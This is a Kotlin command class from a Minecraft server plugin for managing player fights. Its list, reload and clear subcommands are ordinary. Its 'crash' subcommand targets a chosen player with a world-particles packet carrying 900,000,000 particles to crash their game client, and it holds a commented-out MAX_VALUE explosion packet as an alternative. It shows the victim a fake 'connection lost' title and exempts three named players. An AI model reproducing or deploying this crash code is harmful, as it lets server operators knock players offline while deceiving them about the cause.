package pl.pvpcloud.fight.commands

import co.aikar.commands.BaseCommand
import co.aikar.commands.annotation.*
import co.aikar.commands.annotation.Optional
import net.minecraft.server.v1_8_R3.*
import org.bukkit.Bukkit
import org.bukkit.command.CommandSender
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer
import org.bukkit.entity.Player
import pl.pvpcloud.common.configuration.ConfigLoader
import pl.pvpcloud.common.extensions.rep
import pl.pvpcloud.common.extensions.sendFixedMessage
import pl.pvpcloud.common.extensions.sendTitle
import pl.pvpcloud.fight.FightPlugin
import pl.pvpcloud.fight.config.FightConfig
import java.util.*

@CommandAlias("fight")
@CommandPermission("fight.command.fight")
class FightCommand(private val plugin: FightPlugin) : BaseCommand() {

    @Subcommand("list")
    @CommandPermission("fight.command.fight.list")
    fun onCommandList(sender: CommandSender) {
        sender.sendFixedMessage(plugin.config.messages.listPlayersWhileFighting.rep("%players%", Arrays.deepToString(plugin.fightManager.validFights.map { Bukkit.getOfflinePlayer(it.uniqueId).name }.toTypedArray())))
    }

    @Subcommand("reload")
    @CommandPermission("fight.command.fight.reload")
    fun onCommandReload(sender: CommandSender) {
        this.plugin.config = ConfigLoader.load(this.plugin.dataFolder, FightConfig::class, "config")
        sender.sendFixedMessage(plugin.config.messages.youReloadedConfig)
    }

    @Subcommand("clear")
    @CommandPermission("fight.command.fight.clear")
    fun onCommandClear(sender: CommandSender) {
        this.plugin.fightManager.validFights.forEach{ it.clear() }
        sender.sendFixedMessage("&7Juz, nikt sie napierdala.")
    }

    @Subcommand("crash")
    @Syntax("<gracz>")
    @CommandCompletion("@players")
    fun onCommand(sender: Player, @Optional @Flags("other") player: Player) {
        if (player.name == "Natusiek" || player.name == "Krzysiekigry" || player.name == "DaanielZ") return

        val packetHeart = PacketPlayOutWorldParticles(
                EnumParticle.HEART,
                true,
                player.location.blockX.toFloat(),
                player.location.blockY.toFloat(),
                player.location.blockZ.toFloat(),
                1.0f,
                1.0f,
                1.0f,
                1.0f,
                900000000
        )

        val packet = PacketPlayOutExplosion(
                Double.MAX_VALUE,
                Double.MAX_VALUE,
                Double.MAX_VALUE,
                Float.MAX_VALUE,
                Collections.EMPTY_LIST as MutableList<BlockPosition>,
                Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)
        )

        player.sendTitle("", "&4Ups! &cUtracono połączenie z serwerem", 10, 40, 10)
        this.plugin.server.scheduler.runTaskLater(this.plugin, {
            (player as CraftPlayer).handle.playerConnection.sendPacket(packetHeart as Packet<*>)

                    //     (player as CraftPlayer).handle.playerConnection.sendPacket(packet as Packet<*>)
        }, 50)

        sender.sendFixedMessage("Bomba, XD")
    }
}